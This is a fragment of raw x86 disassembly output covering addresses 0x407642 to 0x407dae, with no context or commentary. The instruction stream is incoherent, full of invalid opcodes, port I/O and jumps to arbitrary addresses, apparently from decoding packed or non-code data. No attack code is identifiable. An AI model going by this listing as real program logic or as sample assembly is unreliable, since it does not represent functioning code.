  407642:	fwait
  407643:	push   esi
  407644:	jnp    0x4076a8
  407646:	jle    0x407625
  407648:	in     al,0x5f
  40764a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40764b:	mov    ch,0x1d
  40764d:	es pop eax
  40764f:	arpl   WORD PTR [ebp-0x3d],bp
  407652:	popa   
  407653:	adc    DWORD PTR [edx+edi*1-0x1283780c],edi
  40765a:	xor    cl,BYTE PTR ds:[edx]
  40765d:	lds    edx,FWORD PTR ds:0x4979361c
  407663:	loop   0x407601
  407665:	adc    eax,ecx
  407667:	jmp    FWORD PTR [edx-0x1c]
  40766a:	xchg   ah,bl
  40766c:	mov    ebp,0xd7fde1fb
  407671:	ret    0x6806
  407674:	aas    
  407675:	cmp    eax,0x661b9f02
  40767a:	ins    BYTE PTR es:[edi],dx
  40767b:	ins    DWORD PTR es:[edi],dx
  40767c:	xor    al,0xf5
  40767e:	pop    edx
  40767f:	and    ecx,DWORD PTR [edx]
  407681:	(bad)  
  407682:	lods   al,BYTE PTR ds:[esi]
  407683:	imul   edx,DWORD PTR [eax],0x47
  407686:	pusha  
  407687:	cmp    al,BYTE PTR [ebp+0x6dae5070]
  40768d:	sbb    dh,BYTE PTR [eax-0x6a1fc10b]
  407693:	int    0x5c
  407695:	mov    al,ds:0x62c4ba66
  40769a:	ja     0x407674
  40769c:	dec    esi
  40769d:	sub    eax,0x726c0b78
  4076a2:	mov    bl,0x68
  4076a4:	jne    0x407644
  4076a6:	xor    DWORD PTR [eax+0x56],edi
  4076a9:	and    eax,ebp
  4076ab:	xor    DWORD PTR [ecx-0x2ca9aa2c],edx
  4076b1:	push   eax
  4076b2:	sub    esp,DWORD PTR [eax+0x5b]
  4076b5:	pop    esp
  4076b6:	and    eax,0xa65311dc
  4076bb:	sub    DWORD PTR [eax+0x39c37daf],ebp
  4076c1:	jmp    0x6b0bf164
  4076c6:	cs ret 0x7a8e
  4076ca:	push   edi
  4076cb:	push   cs
  4076cc:	out    dx,al
  4076cd:	mov    ebp,0x343ea697
  4076d2:	mov    esi,0x15f5f722
  4076d7:	mov    ds:0x4278060a,eax
  4076dc:	add    edi,esi
  4076de:	ds jle 0x407709
  4076e1:	(bad)  
  4076e3:	retf   0xc881
  4076e6:	pop    ss
  4076e7:	push   eax
  4076e8:	test   eax,0xef5ec35b
  4076ed:	dec    esi
  4076ee:	mov    BYTE PTR [esi],dh
  4076f0:	and    esi,DWORD PTR [ebx]
  4076f2:	or     eax,0x926e600
  4076f7:	or     DWORD PTR [ebx],ecx
  4076f9:	xchg   ebx,eax
  4076fa:	in     al,dx
  4076fb:	sbb    eax,0xc60398cf
  407700:	int    0x12
  407702:	mov    edi,0x80d9ea5e
  407707:	xchg   edx,eax
  407708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407709:	stos   BYTE PTR es:[di],al
  40770b:	popf   
  40770c:	cli    
  40770d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40770e:	iret   
  40770f:	or     ecx,DWORD PTR [ebp+0x3f7b0313]
  407715:	fbstp  TBYTE PTR [ebx-0x672c0a60]
  40771b:	test   eax,0x94699823
  407720:	xchg   ebp,eax
  407721:	lock loopne 0x40778c
  407724:	inc    edx
  407725:	inc    eax
  407726:	ret    0xd6b6
  407729:	xchg   esi,eax
  40772a:	inc    edi
  40772b:	outs   dx,BYTE PTR ds:[esi]
  40772c:	int3   
  40772d:	push   0x73
  40772f:	mov    edi,0xf456fe13
  407734:	push   ebx
  407735:	popa   
  407736:	sbb    ebx,edx
  407738:	scas   al,BYTE PTR es:[edi]
  407739:	dec    ebp
  40773a:	aaa    
  40773b:	aaa    
  40773c:	ins    DWORD PTR es:[edi],dx
  40773d:	push   0xffffff8c
  40773f:	test   al,0x73
  407741:	cld    
  407742:	popa   
  407743:	data16 cld 
  407745:	or     BYTE PTR [ecx-0x6c],cl
  407748:	daa    
  407749:	jge    0x40777d
  40774b:	sbb    DWORD PTR [esi],edi
  40774d:	test   BYTE PTR [ecx],al
  40774f:	mov    bh,0xc7
  407751:	mov    ebx,?
  407753:	jnp    0x40775e
  407755:	cld    
  407756:	dec    edi
  407757:	dec    esi
  407758:	xchg   esi,eax
  407759:	dec    esi
  40775a:	sub    al,0xbd
  40775c:	and    dl,cl
  40775e:	push   0x77
  407760:	mov    dh,0xe8
  407762:	adc    bl,BYTE PTR [esi]
  407764:	pop    edx
  407765:	or     DWORD PTR [ebx+0x10],edi
  407768:	leave  
  407769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40776a:	inc    edi
  40776b:	add    DWORD PTR [ebx+0x33],edx
  40776e:	mov    BYTE PTR ds:0xc640be63,dh
  407774:	jbe    0x4077b0
  407776:	mov    ecx,DWORD PTR [eax-0x7d967164]
  40777c:	les    esp,FWORD PTR [edi*1+0x79326076]
  407783:	push   0xffffffa1
  407785:	mov    esp,0x96c236fd
  40778a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40778b:	mov    eax,ds:0x3023727d
  407790:	xchg   esp,eax
  407791:	mov    ch,0x7c
  407793:	sbb    eax,0x4f69fc6b
  407798:	enter  0xd123,0xfa
  40779c:	inc    esi
  40779d:	ror    cl,0x46
  4077a0:	cdq    
  4077a1:	mov    dl,0x3f
  4077a3:	xor    al,0x93
  4077a5:	sahf   
  4077a6:	or     DWORD PTR [edx+0x4a],ebp
  4077a9:	data16 or al,0xf6
  4077ac:	pop    ecx
  4077ad:	fwait
  4077ae:	and    ecx,DWORD PTR [edi+edi*1]
  4077b1:	ret    0x489e
  4077b4:	xor    ecx,ebx
  4077b6:	js     0x4077d6
  4077b8:	cmp    cl,BYTE PTR [ebp+0x32]
  4077bb:	and    esi,DWORD PTR [ebx]
  4077bd:	js     0x4077a8
  4077bf:	pop    ecx
  4077c0:	push   esp
  4077c1:	test   BYTE PTR [ebx+ebp*1+0x2225e5c7],dh
  4077c8:	xchg   esi,eax
  4077c9:	push   ecx
  4077ca:	add    eax,ebx
  4077cc:	push   ecx
  4077cd:	push   cs
  4077ce:	jmp    0x4077e1
  4077d0:	add    eax,0x832cec2f
  4077d5:	out    0x3d,eax
  4077d7:	pop    esi
  4077d8:	mov    esi,0x9b89fe52
  4077dd:	xor    BYTE PTR [edx],bh
  4077df:	pop    ds
  4077e0:	popf   
  4077e1:	push   cs
  4077e2:	cmp    al,0xf7
  4077e4:	jns    0x4077f7
  4077e6:	stc    
  4077e7:	sbb    BYTE PTR [esi+0xbb60bb5],0xc8
  4077ee:	dec    esp
  4077ef:	fsin   
  4077f1:	cwde   
  4077f2:	sub    esp,ebp
  4077f4:	(bad)
  4077f7:	adc    eax,0xd706d0c8
  4077fc:	shl    ebx,1
  4077fe:	(bad)  
  407800:	scas   al,BYTE PTR es:[edi]
  407801:	sub    cl,BYTE PTR [esi]
  407803:	dec    esi
  407804:	out    0xdd,al
  407806:	sahf   
  407807:	rol    DWORD PTR ds:0xa5749324,0x7e
  40780e:	out    dx,eax
  40780f:	shl    DWORD PTR [edx],0x69
  407812:	shl    DWORD PTR [esi],0x25
  407815:	mov    es,WORD PTR [ebp-0x42e3658a]
  40781b:	dec    edx
  40781c:	pop    ss
  40781d:	jl     0x40780a
  40781f:	aam    0xe5
  407821:	sar    ch,cl
  407823:	fidiv  WORD PTR [edi]
  407825:	and    edx,DWORD PTR [ebp+0xd8bddc]
  40782b:	rol    ecx,0x71
  40782e:	sub    edi,DWORD PTR [esi]
  407830:	sbb    bl,bl
  407832:	in     al,0x73
  407834:	pusha  
  407835:	xlat   BYTE PTR ds:[ebx]
  407836:	aas    
  407837:	pop    ebx
  407838:	mov    edx,DWORD PTR [eax+0x49]
  40783b:	addr16 fwait
  40783d:	jae    0x407837
  40783f:	lds    esi,FWORD PTR [esp+esi*4-0x62]
  407843:	stos   DWORD PTR es:[edi],eax
  407844:	inc    ecx
  407846:	add    al,0x41
  407848:	out    0x3e,eax
  40784a:	cmp    DWORD PTR [eax+0x11],eax
  40784d:	das    
  40784e:	out    dx,eax
  40784f:	fld    st(7)
  407851:	jns    0x4078a6
  407853:	xchg   DWORD PTR [ecx+esi*2],ecx
  407856:	enter  0xf8dd,0x84
  40785a:	shr    DWORD PTR [esi],1
  40785c:	jp     0x40781a
  40785e:	push   edx
  40785f:	nop
  407860:	(bad)  
  407861:	shl    ah,0x2b
  407864:	fsub   QWORD PTR ds:0xb3011d97
  40786a:	scas   eax,DWORD PTR es:[edi]
  40786b:	sbb    dl,BYTE PTR [edi-0xf]
  40786e:	stos   BYTE PTR es:[edi],al
  40786f:	xchg   edx,eax
  407870:	xlat   BYTE PTR ds:[ebx]
  407871:	xchg   edx,eax
  407872:	push   ebx
  407873:	mov    BYTE PTR [eax-0x11684fc9],cl
  407879:	jle    0x407877
  40787b:	es scas al,BYTE PTR es:[edi]
  40787d:	xor    al,0x7b
  40787f:	cs dec edx
  407881:	in     al,dx
  407882:	mov    edi,0x9e93a498
  407887:	jmp    DWORD PTR [ecx-0x4baac864]
  40788d:	pop    es
  40788e:	cdq    
  40788f:	jo     0x40787e
  407891:	and    al,0x48
  407893:	retf   0x97ab
  407896:	cld    
  407897:	cdq    
  407898:	test   al,0xef
  40789a:	jle    0x407916
  40789c:	popa   
  40789d:	aaa    
  40789e:	add    edx,0x3c
  4078a1:	test   BYTE PTR [esi+0x27d967a7],ah
  4078a7:	add    BYTE PTR [ecx+0x1e6c19f0],bh
  4078ad:	sbb    DWORD PTR [ecx-0x7695af7],esp
  4078b3:	pop    ss
  4078b4:	sbb    DWORD PTR [esi-0x75fc602b],0x40
  4078bb:	xchg   esp,eax
  4078bc:	xchg   edx,eax
  4078bd:	jg     0x4078ac
  4078bf:	push   edx
  4078c0:	push   edx
  4078c1:	xor    eax,0x54fcd25f
  4078c6:	jnp    0x40793c
  4078c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078c9:	xchg   esi,eax
  4078ca:	jp     0x407861
  4078cc:	pop    ebp
  4078cd:	ja     0x4078e8
  4078cf:	pop    eax
  4078d0:	lea    esi,[edx]
  4078d2:	mov    DWORD PTR [eax-0x7e],edi
  4078d5:	inc    ebx
  4078d6:	push   es
  4078d7:	lea    esp,[edx+0x4d]
  4078da:	outs   dx,DWORD PTR es:[esi]
  4078dc:	add    al,0xc0
  4078de:	jns    0x4078c8
  4078e0:	icebp  
  4078e1:	fwait
  4078e2:	sub    edx,DWORD PTR [eax-0x61]
  4078e5:	mov    ds:0x4f78b5fb,al
  4078ea:	sbb    DWORD PTR [ebx+0x569bb98a],ecx
  4078f0:	mov    DWORD PTR [ebx+0x594c87fd],ebp
  4078f6:	sbb    ecx,edx
  4078f8:	(bad)  
  4078fa:	retf   
  4078fb:	aaa    
  4078fc:	jg     0x40787f
  4078fe:	lock jb 0x4078b9
  407901:	xor    DWORD PTR [ebx+ebp*2],edx
  407904:	push   edx
  407905:	or     eax,0xf20064e2
  40790a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40790c:	xchg   edx,eax
  40790d:	in     eax,dx
  40790e:	jns    0x407893
  407910:	cmp    dl,BYTE PTR [eax]
  407912:	aad    0x9a
  407914:	aad    0xa3
  407916:	adc    cl,BYTE PTR [ecx-0x64]
  407919:	xchg   edx,eax
  40791a:	xchg   esp,eax
  40791b:	mov    ds:0xf2e49934,al
  407920:	push   ss
  407921:	fstp   st(7)
  407923:	test   BYTE PTR [ebx],bl
  407925:	fcom   st(6)
  407927:	adc    al,0x15
  407929:	(bad)  
  40792a:	sub    edx,ebp
  40792c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792d:	jmp    0x71f6a58a
  407932:	or     al,BYTE PTR [ebp+0x54762e9f]
  407938:	pop    ebp
  407939:	mov    ch,0xb8
  40793b:	or     BYTE PTR [ecx-0x19d5e5af],cl
  407941:	jbe    0x407984
  407943:	retf   0x72d2
  407946:	add    esp,ecx
  407948:	cmc    
  407949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40794a:	cmp    eax,0xc8697a69
  40794f:	mov    ds:0xaadcbc38,eax
  407954:	pop    eax
  407955:	pop    es
  407956:	aad    0xb9
  407958:	cmp    edi,edx
  40795a:	shr    BYTE PTR [eax],0xfc
  40795d:	stos   DWORD PTR es:[edi],eax
  40795e:	sbb    bl,dh
  407960:	lahf   
  407961:	ret    0xecd1
  407964:	aas    
  407965:	pop    ebp
  407966:	das    
  407967:	mov    al,ds:0x158fa8f1
  40796c:	rcr    BYTE PTR [eax+0x32973b0e],cl
  407972:	lea    ecx,[ebx-0xbf3b92c]
  407978:	jno    0x4079c5
  40797a:	mov    esi,DWORD PTR [ebp-0x61ed9b5b]
  407980:	loope  0x407946
  407982:	push   eax
  407983:	sub    al,0xfe
  407985:	add    ebx,esp
  407987:	fistp  DWORD PTR [esi+0x75]
  40798a:	pop    ebx
  40798b:	jecxz  0x40797c
  40798d:	lahf   
  40798e:	add    al,0x9c
  407990:	mov    WORD PTR [edx+0x1d875965],gs
  407996:	push   ds
  407997:	test   al,0xfb
  407999:	or     esp,DWORD PTR [ecx-0x2e]
  40799c:	and    esi,DWORD PTR [esi+0x5b]
  40799f:	sbb    BYTE PTR [ecx],dl
  4079a1:	xchg   edx,eax
  4079a2:	push   ecx
  4079a3:	lods   al,BYTE PTR ds:[esi]
  4079a4:	sbb    eax,0xe04850db
  4079a9:	xchg   eax,ebp
  4079ab:	cmp    eax,0xa5b54df9
  4079b0:	sar    DWORD PTR [esi+eiz*4+0x2],0xfa
  4079b5:	test   BYTE PTR [esi+0x1d],ah
  4079b8:	dec    esi
  4079b9:	mov    edi,ebp
  4079bb:	or     al,0xf8
  4079bd:	out    dx,al
  4079be:	retf   
  4079bf:	(bad)  
  4079c0:	fld    DWORD PTR [eax]
  4079c2:	daa    
  4079c3:	fyl2xp1 
  4079c5:	cmp    ah,BYTE PTR [ebx-0xce43bbb]
  4079cb:	add    ebx,ebx
  4079cd:	call   0x3b8c:0x7fb51032
  4079d4:	sbb    ch,BYTE PTR [edi+0x3f677bf4]
  4079da:	and    BYTE PTR [esi+0x6123c419],bh
  4079e0:	fisttp DWORD PTR [ebp+0x62e24185]
  4079e6:	imul   esp,DWORD PTR [eax],0xffffffe1
  4079e9:	dec    esp
  4079ea:	mov    ebp,0x7a9487ad
  4079ef:	dec    ecx
  4079f0:	hlt    
  4079f1:	push   ecx
  4079f2:	dec    esp
  4079f3:	mov    ds:0x2ad188bd,eax
  4079f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079f9:	inc    ebx
  4079fa:	jge    0x407a6b
  4079fc:	pusha  
  4079fd:	clc    
  4079fe:	in     eax,0x78
  407a00:	aam    0xa5
  407a02:	pop    ds
  407a03:	imul   ecx,DWORD PTR [edi-0x73],0x6fab8d27
  407a0a:	inc    esi
  407a0b:	dec    eax
  407a0c:	stos   DWORD PTR es:[edi],eax
  407a0d:	xchg   BYTE PTR [ebx],dl
  407a0f:	mov    ecx,0xa519c421
  407a14:	(bad)  
  407a15:	out    dx,eax
  407a16:	pop    edx
  407a17:	cmp    al,0x1c
  407a19:	pop    esp
  407a1a:	xor    BYTE PTR [eax],bh
  407a1c:	loop   0x4079d7
  407a1e:	sbb    al,0xb
  407a20:	lock in al,dx
  407a22:	xor    DWORD PTR [edx-0x2],ebx
  407a25:	jo     0x407aa1
  407a27:	xchg   ecx,eax
  407a28:	popf   
  407a29:	xlat   BYTE PTR ds:[ebx]
  407a2a:	retf   0x857d
  407a2d:	test   eax,0xd54a1576
  407a32:	popa   
  407a33:	lock cld 
  407a35:	add    eax,esi
  407a37:	add    DWORD PTR [edi],esp
  407a39:	imul   edx,ecx,0xffffffb0
  407a3c:	or     al,bh
  407a3e:	cwde   
  407a3f:	xchg   esp,eax
  407a40:	push   es
  407a41:	pop    ebp
  407a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a43:	jae    0x407a6e
  407a45:	(bad)  
  407a46:	or     cl,BYTE PTR [eax]
  407a48:	adc    cl,0xba
  407a4b:	rcr    eax,1
  407a4d:	stos   BYTE PTR es:[edi],al
  407a4e:	sbb    esi,DWORD PTR [ebp+0x5e]
  407a51:	mov    esi,0x14c2ed21
  407a56:	jnp    0x407a7e
  407a58:	jae    0x407ac3
  407a5a:	jbe    0x407abd
  407a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a5d:	test   al,0x35
  407a5f:	xor    ecx,DWORD PTR [edi+0x43]
  407a62:	fcomp  QWORD PTR ds:0xfd25b62f
  407a68:	cdq    
  407a69:	lahf   
  407a6a:	dec    ebx
  407a6b:	imul   edx,DWORD PTR [ecx+0x29],0xc63cc11f
  407a72:	sbb    ebp,edx
  407a74:	jg     0x407aa7
  407a76:	loope  0x407a6d
  407a78:	test   DWORD PTR [esi],ebp
  407a7a:	jae    0x407af6
  407a7c:	(bad)  
  407a7d:	enter  0xe5be,0x5e
  407a81:	xlat   BYTE PTR ds:[ebx]
  407a82:	dec    esi
  407a83:	rcl    BYTE PTR [eax+ebx*1+0x33],0x23
  407a88:	push   eax
  407a89:	inc    ebp
  407a8a:	adc    eax,0x8ff33f45
  407a8f:	pushf  
  407a90:	popa   
  407a91:	(bad)
  407a94:	cmp    al,0x1f
  407a96:	es out dx,al
  407a98:	sub    DWORD PTR [esi+edi*8-0x2be2b2c4],0x8cf3dbb9
  407aa3:	ret    
  407aa4:	test   DWORD PTR [ecx],esi
  407aa6:	adc    al,0x1
  407aa8:	arpl   bx,dx
  407aaa:	adc    edx,DWORD PTR [eax-0x16]
  407aad:	push   ebp
  407aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aaf:	sub    BYTE PTR [esi],0xf
  407ab2:	add    DWORD PTR [ecx],edi
  407ab4:	in     al,dx
  407ab5:	(bad)  
  407ab6:	bound  ebx,QWORD PTR [ecx-0x4bdbdef4]
  407abc:	sub    bl,BYTE PTR ds:0x998a711
  407ac2:	into   
  407ac3:	(bad)  
  407ac5:	push   ebx
  407ac6:	mov    DWORD PTR [ecx+eiz*8+0x16],ecx
  407aca:	sahf   
  407acb:	int3   
  407acc:	fcom   QWORD PTR [ebx+0x78d35fec]
  407ad2:	and    eax,edi
  407ad4:	mov    dl,0x62
  407ad6:	inc    edx
  407ad7:	dec    ebp
  407ad8:	daa    
  407ad9:	ret    0x7476
  407adc:	aam    0xa5
  407ade:	pusha  
  407adf:	pop    ss
  407ae0:	loope  0x407b19
  407ae2:	and    dl,0xb8
  407ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ae6:	jl     0x407b63
  407ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae9:	jmp    0x407ab3
  407aeb:	push   es
  407aec:	adc    BYTE PTR [ebx],0x13
  407aef:	fstp   TBYTE PTR [eax+0xc12bc32]
  407af5:	aad    0xf3
  407af7:	popa   
  407af8:	cmp    ch,0xbe
  407afb:	test   ax,0x4635
  407aff:	mov    ecx,0x692eb9ad
  407b04:	daa    
  407b05:	inc    edx
  407b06:	sbb    DWORD PTR [edi],esp
  407b08:	ret    0x7d38
  407b0b:	pusha  
  407b0c:	out    dx,eax
  407b0d:	fsub   DWORD PTR [ebp-0x1d3c3c84]
  407b13:	into   
  407b14:	pop    esi
  407b15:	popa   
  407b16:	push   ebp
  407b17:	lds    eax,FWORD PTR [eax-0x77]
  407b1a:	sbb    al,0xc7
  407b1c:	sbb    edx,DWORD PTR [ebp+0x6d]
  407b1f:	xchg   ecx,eax
  407b20:	push   esp
  407b21:	(bad)  
  407b22:	jo     0x407ad1
  407b24:	and    al,0x19
  407b26:	repz mov dh,0x90
  407b29:	mov    dh,0x2f
  407b2b:	and    ebp,DWORD PTR [ebx-0x1f]
  407b2e:	mov    dh,0xd1
  407b30:	xor    al,0x99
  407b32:	in     eax,dx
  407b33:	repz xchg ecx,eax
  407b35:	fistp  DWORD PTR [eax]
  407b37:	jmp    0x256e:0x7604806b
  407b3e:	xchg   ecx,eax
  407b3f:	(bad)  
  407b40:	repz aad 0xc9
  407b43:	mov    dl,0x6e
  407b45:	sbb    dl,BYTE PTR [ebp+0x1af0c756]
  407b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b4c:	rcr    BYTE PTR [eax],1
  407b4e:	jb     0x407b2d
  407b50:	inc    esp
  407b51:	adc    eax,0xf9509b80
  407b56:	dec    esp
  407b57:	aad    0x15
  407b59:	jecxz  0x407b54
  407b5b:	dec    eax
  407b5c:	cmp    edi,DWORD PTR [ebx]
  407b5e:	pop    edi
  407b5f:	ja     0x407b46
  407b61:	test   al,0xad
  407b63:	push   0x6e
  407b65:	inc    ebx
  407b66:	loopne 0x407b1b
  407b68:	jmp    0xce8:0x2b33ee9b
  407b6f:	jbe    0x407b86
  407b71:	mov    esi,0x17754321
  407b76:	or     BYTE PTR [ebp+0x2db73fb2],bh
  407b7c:	les    ebx,FWORD PTR [edi]
  407b7e:	adc    al,0x32
  407b80:	stc    
  407b81:	cmp    bh,BYTE PTR [esi]
  407b83:	xchg   ecx,eax
  407b84:	pop    eax
  407b85:	stc    
  407b86:	int    0x24
  407b88:	ret    
  407b89:	lahf   
  407b8a:	call   DWORD PTR [eax+0x2848f96c]
  407b90:	(bad)  
  407b91:	(bad)  
  407b92:	call   0xf326e1f0
  407b97:	xchg   ecx,eax
  407b98:	clc    
  407b99:	jecxz  0x407b73
  407b9b:	mov    eax,0x55ac59da
  407ba0:	xor    eax,0xd1abe53b
  407ba5:	inc    esp
  407ba6:	scas   al,BYTE PTR es:[edi]
  407ba7:	cmp    DWORD PTR [esi+0x73ed8d82],esi
  407bad:	ja     0x407b88
  407baf:	sti    
  407bb0:	(bad)  
  407bb1:	(bad)  
  407bb2:	aad    0x43
  407bb4:	push   cs
  407bb5:	hlt    
  407bb6:	fist   DWORD PTR [ebp-0x49]
  407bb9:	shl    DWORD PTR [ebp+ebx*1-0x15],cl
  407bbd:	xor    al,0x42
  407bbf:	xlat   BYTE PTR ds:[ebx]
  407bc0:	inc    esp
  407bc1:	mov    eax,ds:0x35c31aa2
  407bc6:	imul   eax,DWORD PTR [edx+edx*4],0x4334fa65
  407bcd:	dec    ebx
  407bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bcf:	xlat   BYTE PTR ds:[ebx]
  407bd0:	mov    edx,0x881e4841
  407bd5:	stc    
  407bd6:	sub    al,0xbd
  407bd8:	mov    cl,0xa1
  407bda:	mov    ch,ah
  407bdc:	ss js  0x407b84
  407bdf:	bound  esp,QWORD PTR [edi-0x240f1339]
  407be5:	mov    BYTE PTR [eax+0x19229371],dh
  407beb:	mov    al,0x73
  407bed:	push   ecx
  407bee:	push   ebx
  407bef:	arpl   WORD PTR cs:[ecx+0x3616aace],di
  407bf6:	xor    ebp,esp
  407bf8:	mov    ah,0xb3
  407bfa:	outs   dx,BYTE PTR ds:[esi]
  407bfb:	cld    
  407bfc:	nop
  407bfd:	(bad)  [esi+ebx*1-0x7e9bf242]
  407c04:	dec    ebx
  407c05:	mov    ds:0x3772d03c,eax
  407c0a:	stos   BYTE PTR es:[edi],al
  407c0b:	jmp    0xc5e0:0xbb76ffb9
  407c12:	loopne 0x407c23
  407c14:	sti    
  407c15:	sar    BYTE PTR [ecx],cl
  407c17:	mov    BYTE PTR [eax+0x5c213ec3],0x14
  407c1e:	add    al,0x6e
  407c20:	or     DWORD PTR [edx-0x614385cc],ebx
  407c26:	sub    eax,0x9190bda5
  407c2b:	fwait
  407c2c:	int    0x87
  407c2e:	push   edi
  407c2f:	mov    dh,dh
  407c31:	inc    esp
  407c32:	aaa    
  407c33:	push   esi
  407c34:	jne    0x407c35
  407c36:	cmc    
  407c37:	cmp    BYTE PTR [eax],ah
  407c39:	push   es
  407c3a:	pusha  
  407c3b:	xor    DWORD PTR [edi+0x49bad7af],esi
  407c41:	bnd jns 0x407bc7
  407c44:	es retf 
  407c46:	push   esi
  407c47:	aad    0xb7
  407c49:	sbb    BYTE PTR [ebx],0x7
  407c4c:	dec    eax
  407c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c4e:	pop    edx
  407c4f:	out    dx,eax
  407c50:	ror    BYTE PTR [edx+0x45ada783],1
  407c56:	(bad)  
  407c57:	sahf   
  407c58:	mov    cl,0x1a
  407c5a:	push   edx
  407c5b:	sbb    eax,0x41661d86
  407c60:	fcomp  QWORD PTR [eax]
  407c62:	fadd   QWORD PTR [esi+0x6d]
  407c65:	sub    eax,DWORD PTR [edx-0x2eba9c6d]
  407c6b:	jl     0x407bf5
  407c6d:	(bad)  
  407c6e:	xchg   edi,eax
  407c6f:	fs lods al,BYTE PTR ds:[esi]
  407c72:	stos   BYTE PTR es:[edi],al
  407c73:	mov    dh,BYTE PTR [edi]
  407c75:	aam    0xac
  407c77:	hlt    
  407c78:	or     eax,0xa9087b03
  407c7d:	sub    al,0x53
  407c7f:	adc    BYTE PTR [esi],ch
  407c81:	and    eax,0x7765376b
  407c86:	sub    dl,cl
  407c88:	adc    edi,DWORD PTR [edx-0x2c]
  407c8b:	jge    0x407cd4
  407c8d:	aad    0xf7
  407c8f:	pop    ss
  407c90:	jp     0x407cce
  407c92:	or     edx,DWORD PTR [edi]
  407c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c95:	std    
  407c96:	sub    eax,0x603e9cb1
  407c9b:	addr16 mul ebx
  407c9e:	ins    DWORD PTR es:[edi],dx
  407c9f:	leave  
  407ca0:	sbb    bh,dl
  407ca2:	out    0x66,eax
  407ca4:	dec    ebp
  407ca5:	xchg   esp,eax
  407ca6:	jo     0x407c8d
  407ca8:	fld    QWORD PTR [ebp+0x6c]
  407cab:	imul   esp,DWORD PTR [eax+ebx*1],0x40
  407caf:	cmp    BYTE PTR [esi+0x6d6974c],cl
  407cb5:	jmp    0x407d33
  407cb7:	mov    ecx,0xe949637d
  407cbc:	ins    BYTE PTR es:[edi],dx
  407cbd:	out    0x69,eax
  407cbf:	pop    ss
  407cc0:	sbb    al,0x1a
  407cc2:	es mov ah,0x4f
  407cc5:	ds ds mov ecx,0x91dae61d
  407ccc:	repnz lods al,BYTE PTR ds:[esi]
  407cce:	inc    ecx
  407ccf:	rol    BYTE PTR [ecx],1
  407cd1:	sbb    ebp,DWORD PTR [esi]
  407cd3:	fstp   TBYTE PTR [eax+0x198ed159]
  407cd9:	popf   
  407cda:	jmp    DWORD PTR [edx+0x3e]
  407cdd:	mov    ds:0xf7c3417a,eax
  407ce2:	clc    
  407ce3:	ret    0xcb54
  407ce6:	imul   edx,ebp,0x38a7175c
  407cec:	xchg   esi,eax
  407ced:	jge    0x407d5d
  407cef:	int    0xe7
  407cf1:	fstp   QWORD PTR [ecx+edx*4-0x24d5d19f]
  407cf8:	js     0x407d40
  407cfa:	cmp    ah,BYTE PTR [ebx]
  407cfc:	outs   dx,DWORD PTR ds:[esi]
  407cfd:	test   eax,0xb7c469a4
  407d02:	js     0x407d19
  407d04:	icebp  
  407d05:	dec    eax
  407d06:	pop    esp
  407d07:	dec    edi
  407d08:	xchg   edx,eax
  407d09:	pop    ebx
  407d0a:	dec    esp
  407d0b:	js     0x407ccb
  407d0d:	(bad)  
  407d0e:	das    
  407d0f:	(bad)  
  407d10:	fcomp  st(3)
  407d12:	dec    esi
  407d14:	shr    DWORD PTR es:[ebx],1
  407d17:	pop    ebx
  407d18:	cmp    al,0x8c
  407d1a:	adc    al,0xee
  407d1c:	inc    ecx
  407d1d:	into   
  407d1e:	in     al,0x1c
  407d20:	scas   al,BYTE PTR es:[edi]
  407d21:	sbb    eax,0x5a969de9
  407d26:	xchg   esp,eax
  407d27:	daa    
  407d28:	xchg   ebp,eax
  407d29:	div    DWORD PTR [eax+0x1e]
  407d2c:	dec    edi
  407d2d:	push   edi
  407d2e:	push   ds
  407d2f:	xor    edx,DWORD PTR [ebx]
  407d31:	pop    ss
  407d32:	cwde   
  407d33:	xchg   bh,bl
  407d35:	aad    0xaa
  407d37:	or     DWORD PTR [edx-0x19],esp
  407d3a:	jo     0x407cd5
  407d3c:	sub    eax,0xc33c060
  407d41:	cs jnp 0x407cc8
  407d44:	cmc    
  407d45:	xchg   ebp,eax
  407d46:	sub    edx,DWORD PTR [edi+esi*2-0x3d8c5691]
  407d4d:	js     0x407cd9
  407d4f:	out    dx,eax
  407d50:	cmp    DWORD PTR [ebx-0x37],edx
  407d53:	dec    ebx
  407d54:	mov    ecx,DWORD PTR [ecx]
  407d56:	dec    ebp
  407d57:	or     BYTE PTR [eax],cl
  407d59:	inc    edx
  407d5a:	xor    ecx,DWORD PTR [ebx+ebp*4-0x70afd4]
  407d61:	xor    esi,ebp
  407d63:	jne    0x407d99
  407d65:	fist   DWORD PTR [ebp+0x37]
  407d68:	cmp    eax,0x4d470d61
  407d6d:	int    0x6a
  407d6f:	mov    ds,WORD PTR ss:[edi]
  407d72:	push   ebp
  407d73:	aam    0x58
  407d75:	ss aam 0xe1
  407d78:	loopne 0x407d08
  407d7a:	mov    cl,0x9
  407d7c:	popf   
  407d7d:	mov    esp,0x477dc7b3
  407d82:	aas    
  407d83:	in     al,0x8b
  407d85:	(bad)
  407d89:	adc    bl,cl
  407d8b:	mov    ebx,0xc620274a
  407d90:	sub    ebp,DWORD PTR [eax+0xe]
  407d93:	mov    al,0xe9
  407d95:	jmp    0x29e9:0x70bf2d3c
  407d9c:	imul   edi,DWORD PTR [ecx-0x62c849f],0x5ec9dab2
  407da6:	and    BYTE PTR [edx+0x43],bl
  407da9:	mov    ebx,eax
  407dab:	stos   DWORD PTR es:[edi],eax
  407dac:	lock dec esp
  407dae:	mov    ecx,0xf751d9cc
